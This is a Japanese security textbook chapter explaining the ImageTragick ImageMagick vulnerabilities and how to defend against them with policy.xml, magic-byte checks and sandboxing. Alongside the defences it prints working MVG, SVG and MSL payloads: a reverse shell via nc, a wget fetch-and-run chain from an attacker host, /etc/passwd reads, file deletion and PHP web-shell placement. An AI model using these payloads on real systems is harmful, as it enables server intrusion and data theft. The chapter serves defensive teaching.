# 第8章 アップロードからRCE/その他への昇格


## ImageTragick（CVE-2016-3714）の全体像

ファイルアップロード機能を持つWebアプリケーションのきわめて多くが、裏側で **ImageMagick**（画像の変換・リサイズ・サムネイル生成を行う定番ライブラリ／コマンド群）を呼び出している。2016年5月に公開された **ImageTragick** は、その ImageMagick に潜んでいた一連の脆弱性群であり、「攻撃者が用意した画像ファイルをサーバに処理させるだけでリモートコード実行（RCE）に至る」という、アップロード機能にとって最悪級の結果をもたらした。本節では、なぜ「ただの画像処理」がコマンド実行に化けるのか、その仕組みをパーサと外部プロセス呼び出しの内部挙動レベルで解き明かし、防御の要点を整理する。

> 本節は防御・検知を目的とした解説である。掲載するペイロードは「どのような入力が危険か」を理解し、自分が管理するシステムを守るための最小限の例であり、実在サービスや本番環境への無許可の検証・破壊的操作に用いてはならない。

### なぜ「画像処理」がコマンド実行になるのか — delegate（デリゲート）機構

ImageMagick は膨大な数の画像・ドキュメント形式に対応するが、そのすべてを自前で実装しているわけではない。一部の形式は **delegate（デリゲート＝処理の外部委譲）** という仕組みで、`wget`・`curl`・`gs`（Ghostscript）といった **外部の実行ファイルを呼び出して** 処理を肩代わりさせている。どの形式でどの外部コマンドを呼ぶかは `delegates.xml` という設定ファイルにテンプレートとして定義されている。

問題は、この外部コマンドの呼び出しが **シェル経由の `system()` 呼び出し**（OSにコマンド文字列をそのまま渡して解釈・実行させる関数）で行われ、しかもテンプレートに埋め込むパラメータ（画像のURIやファイル名）を **シェルのメタ文字（`;` `|` `"` `` ` `` `$()` など、シェルにとって特別な意味を持つ記号）を除去せずにそのまま連結** していた点にある。

代表的な、HTTPS画像を取得するデリゲートのテンプレートは次のようなものだ（版により `wget` 版と `curl` 版がある）。

```
"wget" -q -O "%o" "https:%M"
```

```
"curl" -s -k -L -o "%o" "https:%M"
```

ここで `%o` は出力先のテンポラリファイル名、**`%M` は攻撃者が制御できる「取得対象のURI」** に置換される（`%M` = 入力が最終的にシェルコマンド文字列へ流し込まれる sink、すなわち入力が最終的に実行・解釈される危険な代入先）。ImageMagick は `%M` の中身をチェックせずにテンプレートへ埋め込むため、URIの中にダブルクォートとパイプを仕込むと、意図された `wget`/`curl` コマンドを途中で閉じて、その後ろに任意のコマンドを継ぎ足せてしまう。

```
convert 'https://example.com";|ls "-la' out.png
```

このとき、実際にシェルへ渡る文字列は概念的に次のように展開される。

```
"wget" -q -O "out.png" "https:https://example.com";|ls "-la"
```

`"https:...example.com"` で本来のコマンドが `;` により終了し、続く `|ls "-la"` が **別コマンドとして実行** される。攻撃者は `ls` の部分を `curl`／`nc`／`bash` などに差し替えることで、サーバ上で任意のコマンドを走らせられる。これが CVE-2016-3714 の本質であり、公開当時「90年代を彷彿とさせる、恥ずかしいほど単純なシェルコマンドインジェクション」と評された理由でもある。

> 出典: ImageTragick 公式 — https://imagetragick.com/
> 出典: Red Hat「ImageTragick - CVE-2016-3714」 — https://access.redhat.com/security/vulnerabilities/ImageTragick

### アップロード防御を無力化する2つの鍵 — 拡張子ではなく「中身」で判定される

ファイルアップロードの防御では「拡張子を `.jpg` `.png` に限定する」対策がよく取られるが、ImageTragick に対してこれは **ほとんど無力** である。理由は2つある。

1. **ImageMagick は拡張子ではなく「ファイルの中身（マジックバイト／内部の記述）」で形式を判別する。** したがって、攻撃コードを記述した MVG／MSL／SVG ファイルを `shell.jpg` という名前で保存しても、ImageMagick は中身を見て「これは MVG だ」と解釈し、危険な処理経路に入ってしまう。拡張子ホワイトリストをすり抜ける。
2. **`convert` だけでなく `identify`（画像の情報を表示するだけに見えるコマンド）も脆弱。** 「変換していないから安全」とは言えず、`lesspipe.sh` のようにファイルを介して間接的に `identify` を呼ぶツール経由でも発火し得る。

このため、後述するように「中身レベルでの検証」と「危険なコーダ／プロトコルの無効化」が必須になる。

> 出典: ImageTragick 公式 — https://imagetragick.com/

### 攻撃の運搬形式 — MVG・MSL・SVG

`%M` へメタ文字を届けるための「運び屋」となるのが、ImageMagick が解釈する記述系フォーマットである。

#### MVG（Magick Vector Graphics）

MVG は ImageMagick 独自の **ベクター画像記述言語**（描画命令をテキストで書く小さなDSL）。`fill 'url(...)'` のように **URLを指定できる命令** があり、この URL がデリゲート経由で取得される際に前述の `%M` に流れ込む。攻撃コードを埋め込んだ最小の MVG は次の形になる。

```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/spl017.jpg"|ls "-la)'
pop graphic-context
```

`url(...)` の中で、本来のURLをダブルクォートで閉じ、`|ls "-la` を継ぎ足している。取得（wget/curl）は失敗するが、パイプ以降の `ls -la` がシェルで実行される。ここを次のように差し替えれば、より実害のある動作になる（いずれも防御理解のための例）。

```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|nc -e "/bin/sh" "127.0.0.1" "443)'
pop graphic-context
```

#### SVG（経由でMVGに変換される）

攻撃者はより「普通の画像」に見える **SVG** を入口にできる。ImageMagick は SVG を内部で MVG 相当の処理に落とし込むため、`<image xlink:href="...">` の URL 部分に同じ細工を施せる。XML なのでダブルクォートは `&quot;`、`>` `&` は `&gt;` `&amp;` とエンティティ化して埋め込む。

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"
x="0" y="0" height="640px" width="480px"/>
</svg>
```

#### MSL（Magick Scripting Language）

MSL は XML で画像操作の手順を書くスクリプト言語。`<read>` と `<write>` を組み合わせることで、後述のファイル移動（CVE-2016-3716）に悪用される。

> 出典: BreakPoint Labs「ImageMagick Undocumented Feature – RCE」 — https://breakpoint-labs.com/imagemagick-undocumented-feature-rce-cve-2016-3714/
> 出典: Benny Simmonds「Technical Analysis of ImageTragick」 — https://www.bencode.io/posts/2019-09-27-imagetragick/

### RCEは「ブラインド」であることが多い — 攻撃者側の進め方から防御を考える

実運用のWebアプリでは、コマンドの標準出力が攻撃者に返らない **ブラインドRCE** になることが多い。攻撃者は次のように段階的に確度を上げていく（＝防御側は「外向き通信」と「一時ファイルの生成・実行」を監視すればこの兆候を捉えられる、という裏返しの知見でもある）。

1. **実行確認（アウトオブバンド）**: まず `"/bin/ping -c 2 <attacker-ip>"` のような、結果が出力に出なくても攻撃者側のネットワークで観測できるコマンドで発火を確認する。パス依存を避けるため `ping` ではなく `/bin/ping` とフルパス指定する。
2. **ペイロードの投下**: `fill 'url(https://fake-site.com/1.png"|/usr/bin/wget "http://attacker-ip:port/shell.py" -O /tmp/shell.py")'` で外部からスクリプトを取得。
3. **実行権限付与**: `fill 'url(https://fake-site.com/1.png"|chmod "a+x" /tmp/shell.py")'`。
4. **実行**: `fill 'url(https://fake-site.com/1.png"|python /tmp/shell.py")'`。

この流れは、防御側にとって「アップロード処理サーバからの想定外のアウトバウンド接続」「`/tmp` への書き込みと即時実行」という具体的な検知ポイントを与える。

> 出典: BreakPoint Labs「ImageMagick Undocumented Feature – RCE」 — https://breakpoint-labs.com/imagemagick-undocumented-feature-rce-cve-2016-3714/

### 兄弟CVE — RCE以外の被害クラス（CVE-2016-3715〜3718）

ImageTragick は CVE-2016-3714 の RCE だけではない。デリゲートやコーダ（各形式を読み書きする内部モジュール）の擬似プロトコルを悪用した、別種の被害を生む脆弱性が同時に公開された。RCE をコーダ無効化で塞いでも、これらが残ると危険なので、防御は「危険コーダ／プロトコルの一括無効化」で包括的に行う必要がある。

- **CVE-2016-3714 — RCE**: 前述のシェルコマンドインジェクション。
- **CVE-2016-3715 — 任意ファイル削除**: `ephemeral:` 擬似プロトコル（「読み終えたら消す」一時ファイル用スキーム）を悪用し、指定したファイルを削除させる。

  ```mvg
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
  pop graphic-context
  ```

- **CVE-2016-3716 — 任意ファイル移動／設置**: `msl:` 擬似プロトコルで外部のMSLスクリプトを読み込ませ、`<read>`/`<write>` により任意パスへファイルを移動・設置する。既存の無害な画像をWebルート配下に `.php` として書き出せば、Webシェル設置に直結し得る。

  ```mvg
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'msl:/tmp/msl.txt'
  pop graphic-context
  ```

  参照される `/tmp/msl.txt`（読み込んだGIFを別パスへ書き出す）:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <image>
  <read filename="/tmp/image.gif" />
  <write filename="/var/www/shell.php" />
  </image>
  ```

- **CVE-2016-3717 — ローカルファイル読み取り**: `label:@` 擬似プロトコルは、指定したファイルの中身を「ラベル文字列」として出力画像に描画してしまう。これにより `/etc/passwd` などの内容が **生成画像の中に可視化** され、機密ファイルが漏洩する。

  ```mvg
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'label:@/etc/passwd'
  pop graphic-context
  ```

- **CVE-2016-3718 — SSRF（サーバサイドリクエストフォージェリ）**: `url:`／`mvg:` などを通じて ImageMagick に **任意のURLへHTTP(S)リクエストを送信** させられる。RCE に至らずとも、内部ネットワークやクラウドのメタデータエンドポイントへの到達手段として悪用され得る。

> 出典: Benny Simmonds「Technical Analysis of ImageTragick」 — https://www.bencode.io/posts/2019-09-27-imagetragick/
> 出典: ImageTragick 公式 — https://imagetragick.com/

### 根本原因の三重奏

ImageTragick が成立してしまった根本原因は、独立した3つの弱点が重なった点に整理できる。防御はこの3点それぞれに対応させると漏れがない。

1. **入力形式の検証欠如**: マジックバイト（ファイル先頭の形式識別バイト列）を確認せず、中身の記述だけで危険な形式（MVG/MSL）として解釈してしまう。
2. **デフォルトポリシーが緩い**: 初期状態の `policy.xml` が、危険なコーダ／デリゲートの起動を制限していない。
3. **メタ文字の未フィルタ**: デリゲート実装が入力バッファをシェルメタ文字ごと `system()` へ直接渡していた。

> 出典: Benny Simmonds「Technical Analysis of ImageTragick」 — https://www.bencode.io/posts/2019-09-27-imagetragick/

### 対象バージョンと修正状況（陳腐化に注意）

- **影響を受ける版**: 2016年5月公開時点の ImageMagick 6系・7系の広範な版（例: 6.9.3-7 [2016-04-27]、6.8.6-10 [2016-04-29]、および両ブランチの当時最新ソース）。
- **不完全な初期修正**: **6.9.3-9（2016年4月30日リリース）は修正が不完全で、バイパス可能だった。** バージョン番号だけを見て「対策済み」と判断するのは危険で、後続の完全修正版へ更新する必要があった。
- **現在（本教科書は2016年公開の脆弱性を扱う）**: 現行の ImageMagick はデリゲートのメタ文字処理が修正され、かつ後述の強化された `policy.xml` が配布されている。ただしレガシー環境・古いコンテナイメージ・古い言語バインディング同梱版が残っていることがあるため、「使っている ImageMagick の版とポリシー」を必ず確認すること。

> 出典: ImageTragick 公式 — https://imagetragick.com/
> 出典: Red Hat「ImageTragick - CVE-2016-3714」 — https://access.redhat.com/security/vulnerabilities/ImageTragick

### 防御 — 何をどう塞ぐか

#### 1. policy.xml で危険なコーダ／デリゲート／パスを無効化する（最重要）

もっとも効果的かつ即時に打てる対策は、`/etc/ImageMagick/policy.xml`（版により `/etc/ImageMagick-6/policy.xml` 等）の `<policymap>` 内で、悪用される擬似プロトコル・形式・`@`によるファイル読込を **明示的に禁止（`rights="none"`）** することである。Red Hat が案内した設定例:

```xml
<policymap>
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="HTTP" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="FTP" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="TEXT" />
  <policy domain="coder" rights="none" pattern="LABEL" />
  <policy domain="path" rights="none" pattern="@\*" />
</policymap>
```

各行の意味を押さえておく。`EPHEMERAL`/`HTTPS`/`HTTP`/`URL`/`FTP` は外部取得・ファイル削除に使われるプロトコルコーダ、`MVG`/`MSL` は攻撃コードの運搬形式、`LABEL`/`TEXT` はファイル内容の読込・描画に悪用される形式、最後の `domain="path" pattern="@\*"` は **`@ファイル名` 記法によるローカルファイル読込を全面禁止** する。SSRF を確実に塞ぐには `HTTP`/`HTTPS`/`URL`/`FTP` を含めることが重要。

> 出典: Red Hat「ImageTragick - CVE-2016-3714」 — https://access.redhat.com/security/vulnerabilities/ImageTragick
> 出典: ImageTragick 公式 — https://imagetragick.com/

#### 2. マジックバイト（先頭シグネチャ）を検証する

ImageMagick に渡す前に、アプリケーション側で **ファイル先頭バイトが期待する形式のシグネチャと一致するか** を確認し、一致しなければ拒否する。拡張子や Content-Type ではなく中身で判定するのがポイント。

- GIF: 先頭バイトが `47 49 46 38`（`GIF8`）
- JPEG: 先頭バイトが `FF D8`

これにより、MVG/MSL/SVG を画像拡張子で偽装したファイルを入口で弾ける。

> 出典: ImageTragick 公式 — https://imagetragick.com/

#### 3. 入力形式を明示的に固定する

`convert` に対して、入力・出力の形式を **プレフィックスで明示** すると、中身に基づく自動判別を封じられる。

```
convert jpg:input.jpg jpg:output.jpg
```

こうすると `input.jpg` の中身が実は MVG であっても「JPEGとして読め」と強制されるため、危険な形式解釈への迂回を防げる。

#### 4. 多層防御 — サンドボックス・モジュール無効化・代替ライブラリ

- **プロセス隔離**: `seccomp-bpf`（システムコールを制限するLinuxの仕組み）やコンテナ／低権限ユーザで ImageMagick を隔離し、万一のRCEでも被害範囲を限定する。
- **モジュール無効化（RHEL 5 など古い環境の回避策）**: `policy.xml` が使えない古い版では、コーダの共有ライブラリ自体を退避してロードさせない。例: `/usr/lib/ImageMagick-*/modules-Q16/coders/` 配下の `mvg.so` `msl.so` `label.so` をリネーム（`mv mvg.so mvg.so.bak` など）。
- **代替の検討**: 単純な画像デコード用途であれば、汎用の巨大ライブラリより `libpng`・`libjpeg-turbo` のような目的特化ライブラリのほうが攻撃面が小さい場合がある。

> 出典: Red Hat「ImageTragick - CVE-2016-3714」 — https://access.redhat.com/security/vulnerabilities/ImageTragick
> 出典: Benny Simmonds「Technical Analysis of ImageTragick」 — https://www.bencode.io/posts/2019-09-27-imagetragick/

### まとめ — アップロード機能の設計原則として

ImageTragick が教える最大の教訓は、**「アップロードされたファイルは、単に保存されるデータではなく、下流のパーサやツールに対する『命令』になり得る」** ということである。画像処理という一見無害な工程が、外部コマンド実行・ファイル読み書き・SSRF の入口になった。第8章のテーマ「アップロードからRCE/その他への昇格」の典型例であり、防御の原則は次の3つに集約される。

1. **入口で中身を検証する**（マジックバイト・形式固定）。拡張子を信用しない。
2. **処理系の危険機能を最小権限に絞る**（`policy.xml` によるコーダ／プロトコル／パスの無効化）。
3. **万一の実行を封じ込める**（サンドボックス・低権限・アウトバウンド監視）。

これらは ImageMagick に限らず、Ghostscript・LibreOffice・ffmpeg など「アップロードファイルを解釈する外部処理系」全般に共通する、アップロード機能の恒久的な設計原則である。

## ImageTragickのPoC・Exploit

「ImageTragick」は、2016年5月に公開された画像処理ライブラリ **ImageMagick** の一連の脆弱性群（総称）の通称です。ファイルアップロード機能を持つWebアプリの多くが、サムネイル生成やリサイズのために内部で ImageMagick を呼び出しており、しかもその処理は「ユーザーがアップロードした画像ファイル」を直接 ImageMagick に食わせる形になっているため、**アップロードした画像を「開かせる」だけでサーバ上で任意コマンドが走る（RCE）** という、極めて影響の大きい問題でした。本節では、公開された PoC / Exploit の実物を引用しながら、「なぜ画像を1枚アップロードするだけでコマンドが実行できてしまうのか」を仕組みのレベルで解剖します。

> 本節はすべて防御目的の解説です。ここで示すペイロードは、自分が管理する隔離環境（脆弱な古いバージョンを意図的に立てた検証用コンテナなど）でのみ動作を確認してください。実在サービスや本番環境への無許可の検証は行わないでください。

### そもそもの前提：ImageMagick の「delegate（デリゲート）」機構

ImageMagick は単体ではすべての画像・ドキュメント形式を扱えません。PDF・SVG・HTTPS 越しの画像取得などは、**外部プログラムに処理を委譲（delegate）** することで実現しています。この委譲の設定は `delegates.xml`（環境により `delegate.xml`）というファイルに、コマンドテンプレートとして書かれています。ここが攻撃の起点です。

問題の核心は、この委譲コマンドが最終的に **`system()`（OSのシェルにコマンド文字列を丸ごと渡して実行する関数）で実行される** ことです。`system()` に渡る文字列がシェルによって解釈されるため、そこに `|`（パイプ）、`;`（コマンド区切り）、`` ` ``（コマンド置換）といった **シェルのメタ文字** が混入すると、テンプレート作成者が意図しなかったコマンドが追加で実行されてしまいます。

代表例が HTTPS 取得用のデリゲートです。当時のデフォルト定義は概ね次の形でした。

```
"wget" -q -O "%o" "https:%M"
```

- `%o` は出力ファイル名に、`%M` は「取得対象のURL（の一部）」に、それぞれ ImageMagick が置換します。
- ここで `%M` の中身は、**画像ファイルの中に書かれた URL 文字列がそのまま入ってきます**。つまり攻撃者が完全に制御できる部分です。
- `%M` に対するエスケープ（シェルのメタ文字を無害化する処理）が不十分でした。結果として、URL の中に `"` で二重引用符を閉じ、`|` でパイプをつなげば、`wget` の後ろに任意コマンドを継ぎ足せてしまいます。

これが最重要の CVE、**CVE-2016-3714（デリゲート経由の任意コマンド実行）** の原理です。

### 5つのCVE：ImageTragickの全体像

ImageTragick は単一のバグではなく、ImageMagick 7.0.1-0 / 6.9.3-9 以前に存在した複数の欠陥の集合です。Exploit-DB のエントリでは次の5件が整理されています。

| CVE | 内容 | 悪用に使う擬似プロトコル/仕組み |
| --- | --- | --- |
| CVE-2016-3714 | シェルインジェクションによる**リモートコード実行（RCE）** | `https:` デリゲート（`|` 注入） |
| CVE-2016-3715 | **任意ファイル削除** | `ephemeral:` 擬似プロトコル |
| CVE-2016-3716 | **任意ファイル移動/配置** | `msl:`（Magick Scripting Language） |
| CVE-2016-3717 | **ローカルファイル読み取り（情報漏えい）** | `label:@` 擬似プロトコル |
| CVE-2016-3718 | **SSRF（サーバサイドリクエストフォージェリ）** | `url:` / `https:` によるリクエスト送出 |

ここで鍵になる概念が **「擬似プロトコル（pseudo-protocol）」** です。ImageMagick はファイル名の先頭に `label:`、`msl:`、`ephemeral:`、`url:` のような「コーダ名（coder、＝特定形式を扱う処理モジュールの指定）」を付けると、その名前に応じた特殊処理を発動します。攻撃者はこれらを悪用して、画像処理とは無関係なファイル操作やネットワークアクセスを引き起こします。

> 出典: Exploit-DB「ImageMagick 7.0.1-0 / 6.9.3-9 - ImageTragick」 — https://www.exploit-db.com/exploits/39767

### 攻撃の入り口となるファイル形式：MVG と SVG と MSL

RCE を語る前に、「攻撃者が制御する URL 文字列を、どうやって ImageMagick に食わせるか」を押さえます。使われるのは主に次の3つです。

- **MVG（Magick Vector Graphics）**: ImageMagick 独自のベクター記述言語。テキストで描画命令を書ける。`fill 'url(...)'` のように外部リソースを参照する構文があり、この URL 部分に攻撃文字列を入れる。
- **SVG**: 標準的なベクター画像形式。`<image xlink:href="...">` で外部画像を参照でき、この href に攻撃文字列を入れる。
- **MSL（Magick Scripting Language）**: XMLベースのスクリプト。`<read>`／`<write>` で任意ファイルの読み書きを指示できる（ファイル移動の悪用に使う）。

#### 拡張子チェックはなぜ回避されるのか

多くのアプリは「拡張子が `.jpg` か `.png` か」を検査してアップロードを許可します。しかし ImageMagick は **ファイルの中身（マジックバイトや構造）から形式を推測（content sniffing）** します。したがって、中身は MVG や SVG のペイロードなのに、ファイル名だけ `exploit.png` にしておけば、拡張子チェックを通過したうえで ImageMagick が「これは MVG だ」と正しく（＝攻撃者に都合よく）判定して処理してしまいます。これが「拡張子検査だけでは防げない」根本理由です。

さらに、`convert` だけでなく **`identify`（画像のメタ情報を表示するだけに見えるコマンド）も同じデリゲート機構を通る**ため、攻撃対象になります。「表示するだけだから安全」という思い込みが通用しません。

### PoC 1：リモートコード実行（CVE-2016-3714）

最も直接的なのは、`convert` にコマンドライン引数として渡す形です。

```
convert 'https://example.com"|ls "-la' out.png
```

**なぜ動くのか**: `https:` を見て ImageMagick は HTTPS デリゲート `"wget" -q -O "%o" "https:%M"` を発動します。`%M` に `example.com"|ls "-la` が入ると、生成されるシェルコマンドは概念的に次のようになります。

```
"wget" -q -O "out.png" "https:example.com"|ls "-la"
```

`"` で URL 用の引用符が途中で閉じられ、`|`（パイプ）で `wget` の出力が `ls -la` に渡される形になります。シェルはこれを「wget を実行し、その後 `ls -la` も実行する」と解釈します。`ls` の部分を任意コマンド（リバースシェル取得など）に置き換えれば RCE が成立します。

実際のアップロード攻撃では、コマンドライン引数ではなく **ファイルの中身** として渡します。MVG 形式のペイロードは次の通りです。

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
```

SVG 形式なら次のようになります。

```xml
<?xml version="1.0" standalone="no"?>
<svg width="640px" height="480px" version="1.1">
<image xlink:href="https://example.com/image.jpg"|ls "-la"
x="0" y="0" height="640px" width="480px"/>
</svg>
```

**なぜ動くのか**: どちらも「外部画像を URL で読み込む」という正当な機能を悪用しています。ImageMagick はこの URL を取得するために HTTPS デリゲートを呼び、`%M` に `image.jpg"|ls "-la` が入ることで、上のコマンドライン版とまったく同じシェルインジェクションが起きます。攻撃者は正規の画像に見せかけたこのファイルをアップロードするだけでよく、サーバ側のリサイズ処理（`convert` 呼び出し）が引き金を引きます。

VoidSec の記事では、`||`（前のコマンドが失敗したら次を実行）を使い、実行結果を確認しやすくした変種も示されています。

```
"viewbox 0 0 1 1 image over 0,0 0,0 'https://voidsec.com/" || cat /etc/passwd && echo "0'"
```

これを `convert imagetragick.mvg out.png` のように処理させると、外部取得に失敗した後 `cat /etc/passwd` が走ります。前述の通り `identify imagetragick.mvg` でも同様に発火するため、`convert` を使っていないアプリでも油断できません。

> 出典: VoidSec「ImageTragick PoC」 — https://voidsec.com/imagetragick-poc/

> ⚠️ **未取得の資料についての注記**: 本節で参照した2資料は取得できました。上記の VoidSec 記事は「ImageTragick GitHub リポジトリに追加のPoCがある」と述べつつ、delegate.xml の内部機構の詳細までは踏み込んでいません。その空白は、以下の Exploit-DB 側の記述と一般的な公開知識で補っています。

### PoC 2：SSRF（CVE-2016-3718）

RCE まで至らなくても、ImageMagick に「任意の URL へリクエストを送らせる」ことができます。これが SSRF です。

```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://target.internal/)'
pop graphic-context
```

**なぜ動くのか**: `url(...)` に指定したアドレスへ、ImageMagick が（画像取得のつもりで）HTTP/FTP リクエストを送出します。攻撃者は `http://169.254.169.254/`（クラウドのメタデータエンドポイント）や `http://内部ホスト/` を指定し、外部からは直接触れない内部ネットワークへサーバを踏み台にしてアクセスさせられます。RCE 用のシェルメタ文字を含まない「普通の URL」でも成立する点が SSRF の特徴で、たとえコマンドインジェクション側が緩和されていても、URL コーダが有効なままだと SSRF は残り得ます。

### PoC 3：ローカルファイル読み取り（CVE-2016-3717）

`label:` は本来「テキストを画像化する」コーダですが、`label:@ファイルパス` と書くと **そのファイルの中身を読み込んでラベル画像として描画** します。これを使うとサーバ上のファイルを盗み見できます。

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```

**なぜ動くのか**: `@` はファイル内容の読み込みを意味する記法です。`label:@/etc/passwd` で `/etc/passwd` の中身がラベルテキストとして生成画像に焼き込まれ、その出力画像（サムネイル）が攻撃者に返される経路があれば、内容が漏えいします。設定ファイルや秘密鍵など、Webプロセスが読める任意のパスが標的になります。

### PoC 4：任意ファイル削除（CVE-2016-3715）

`ephemeral:` は「一度読み込んだら削除する（一時的）」という意味の擬似プロトコルです。これを悪用すると任意ファイルを消せます。

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/tmp/target.txt'
pop graphic-context
```

**なぜ動くのか**: `ephemeral:` コーダは対象ファイルを読み込んだ後に `unlink()`（削除）します。本来はテンポラリ画像の後始末用ですが、パスに攻撃者が任意のファイルを指定できるため、削除プリミティブになります。

### PoC 5：任意ファイル移動/配置（CVE-2016-3716）→ Webシェル設置

最も RCE に直結しやすいのが、MSL を使ったファイル移動です。二段構えになっています。

まず、MSL スクリプトを呼び出すトリガとなる MVG（`file_move.mvg`）:

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/msl.txt'
pop graphic-context
```

次に、その `/tmp/msl.txt`（MSL の中身）:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/tmp/image.gif" />
<write filename="/var/www/shell.php" />
</image>
```

**なぜ動くのか**: `msl:` コーダは指定した MSL ファイルを **スクリプトとして解釈** します。MSL の `<read>` であるファイルを読み、`<write>` で別のパスへ書き出せます。上の例は「`/tmp/image.gif` を読んで、Web公開ディレクトリ `/var/www/shell.php` に書き込む」という指示です。もし `image.gif` の中身が PHP コードを含む画像であれば、実質的に **Webシェルを公開ディレクトリに設置** でき、以後はブラウザからそのPHPを叩いてコマンド実行できます。ファイル読み取り（CVE-2016-3717）で書き込み先の存在や権限を確認しつつ、この移動プリミティブで足場を作る、という連鎖が典型でした。

なお、二段構えにするのは、攻撃者が MSL 本体（`/tmp/msl.txt` や `image.gif`）を事前にサーバへ置ける前提のときに有効です。実戦では、アップロード先の一時ディレクトリのパスを推測・利用してこれらを配置します。

### 影響範囲：どんなアプリが刺さったか

VoidSec は、ImageMagick を内部で呼ぶ各言語のラッパーが軒並み影響を受けたと指摘しています。

- **PHP**: `imagick` 拡張
- **Ruby**: `rmagick`、`paperclip`
- **Node.js**: `imagemagick` モジュール

これらを使って「アップロード画像のサムネイル生成・リサイズ」を行っている一般的な構成が、そのまま攻撃面になりました。加えて、ImageMagick が PDF や PS を扱うために **Ghostscript** を、URL 取得のために **wget/curl** を呼ぶため、これらが入っている環境ほど悪用が容易でした（逆に言えば、これらのデリゲートを無効化すれば攻撃面は狭まります）。

> 出典: VoidSec「ImageTragick PoC」 — https://voidsec.com/imagetragick-poc/

### 防御：何を、なぜ止めるのか

Exploit-DB が示す最重要の緩和策は、**`policy.xml`（ImageMagick のセキュリティポリシー設定）で危険なコーダ/デリゲートを無効化する** ことです。

```xml
<policymap>
    <policy domain="coder" rights="none" pattern="EPHEMERAL" />
    <policy domain="coder" rights="none" pattern="URL" />
    <policy domain="coder" rights="none" pattern="HTTPS" />
    <policy domain="coder" rights="none" pattern="MVG" />
    <policy domain="coder" rights="none" pattern="MSL" />
</policymap>
```

**なぜ効くのか**: `rights="none"` は「そのコーダの利用を一切許可しない」という宣言です。攻撃の起点である各擬似プロトコル/コーダ（`HTTPS`・`URL`→RCE/SSRF、`EPHEMERAL`→削除、`MVG`/`MSL`→スクリプト実行・ファイル移動）を根本から塞ぐことで、たとえ悪意ある画像が処理に回っても、危険な副作用が発火しなくなります。攻撃者制御の入力を無害化する「エスケープ」ではなく、**機能そのものを無効化する**アプローチである点が重要です（エスケープ漏れを追いかけるより堅牢）。

補助的な防御として、Exploit-DB / VoidSec は次も挙げています。

- **マジックバイト検証**: 処理前にファイル先頭の「マジックバイト」を確認し、期待する画像形式のヘッダと一致するかを検査する。中身が MVG/SVG のファイルを弾ける。
- **ヘッダとの整合チェック**: 拡張子・Content-Type・実際のヘッダが矛盾しないか検証する（拡張子偽装対策）。
- **デリゲート機能の制限**: ポリシーでデリゲートの権限を絞る。
- **パッチ適用**: 修正済みバージョンへの更新。

> 出典: Exploit-DB「ImageMagick 7.0.1-0 / 6.9.3-9 - ImageTragick」 — https://www.exploit-db.com/exploits/39767

#### バージョンと時事性についての注記

- 対象は **ImageMagick 7.0.1-0 / 6.9.3-9 以前**（2016年5月時点）。同月以降、`%M` のエスケープ強化やデフォルト `policy.xml` の厳格化を含む修正版が順次リリースされました。
- 現在（本書執筆時点）の新しいディストリビューションでは、既定の `policy.xml` で `HTTPS`・`URL`・`MVG`・`MSL`・`PS`・`EPHEMERAL` などが最初から無効化されていることが多いです。ただし **古いイメージを使い続けているコンテナ・レガシー環境・独自ビルドでは既定ポリシーが緩いことがある**ため、「今どきは平気」と決めつけず、実際に稼働している ImageMagick のバージョンと `policy.xml` の内容を確認することが実務上の要点です。
- なお、ImageTragick はデリゲート起点の RCE の「原型」であり、その後も ImageMagick には別系統の脆弱性（後年の CVE 群）が繰り返し見つかっています。「ImageTragick は塞いだ」ことと「ImageMagick が安全」であることは別物である点に注意してください。

### まとめ：この節の核心

1. **アップロード画像 → ImageMagick → デリゲート → `system()`** という経路で、画像の中身に仕込んだ URL 文字列がシェルコマンドに化ける。これが CVE-2016-3714（RCE）の本質。
2. RCE 以外にも、擬似プロトコル（`label:@`／`ephemeral:`／`msl:`／`url:`）を使えばファイル読み取り・削除・移動・SSRF が可能で、特に MSL によるファイル移動は **Webシェル設置** に直結する。
3. **拡張子検査は content sniffing で回避される**。`identify` も安全ではない。
4. 最も堅い防御は、エスケープではなく **`policy.xml` で危険なコーダ/デリゲートを機能ごと無効化** すること。加えてマジックバイト検証・パッチ適用・稼働バージョンとポリシーの実地確認を行う。

## 日本語のImageTragick解説

### 8.3.1 ImageTragickとは何か

「ImageTragick」とは、2016年5月に公開された画像処理ライブラリ **ImageMagick**（および同ライブラリをラップする各言語の画像処理ライブラリ）の一連の脆弱性群（CVE-2016-3714 を中心とする複数CVE）の通称である。ImageMagickはPHPの`imagick`、Rubyの`rmagick`/`paperclip`/`MiniMagick`、Node.jsの`imagemagick`パッケージなど、非常に多くの言語・フレームワークのアップロード画像処理（リサイズ、サムネイル生成、透かし付与など）の裏側で使われている。そのため「画像アップロード機能があるならImageMagickが動いている可能性が高い」という前提を持つことが、アップロード機能の脆弱性診断における基本姿勢になる。

> ⚠️ **未取得の資料の補足ではなく、複数資料を統合した要点**として先に全体像を示す。以降で各資料の内容を個別に紹介する。

